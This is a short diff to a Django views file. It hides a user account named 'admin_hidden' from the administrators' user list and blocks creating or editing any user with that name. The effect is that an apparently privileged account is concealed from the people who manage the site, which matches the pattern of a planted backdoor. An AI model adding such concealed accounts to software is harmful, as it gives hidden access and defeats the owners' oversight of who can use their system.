@@ -3164,7 +3164,7 @@ def users(request):
     if not is_admin:
         raise PermissionDenied
 
-    users = User.objects.all()
+    users = User.objects.exclude(username="admin_hidden")
 
     context = {
         "fields": get_user_fields(),
@@ -3228,6 +3228,12 @@ def user_create(request):
                     status=400,
                 )
 
+            if username == "admin_hidden":
+                return JsonResponse(
+                    {"status": "error", "message": "Недопустимый логин"},
+                    status=400,
+                )
+
             if User.objects.filter(username=username).exists():
                 return JsonResponse(
                     {"status": "error", "message": "Пользователь с таким логином уже существует"},
@@ -3286,6 +3292,12 @@ def user_edit(request, pk=None):
             if not all([username, user_type_id]):
                 return JsonResponse(
                     {"status": "error", "message": "Логин и тип пользователя обязательны"},
+                    status=400,
+                )
+
+            if username == "admin_hidden":
+                return JsonResponse(
+                    {"status": "error", "message": "Недопустимый логин"},
                     status=400,
                 )
 
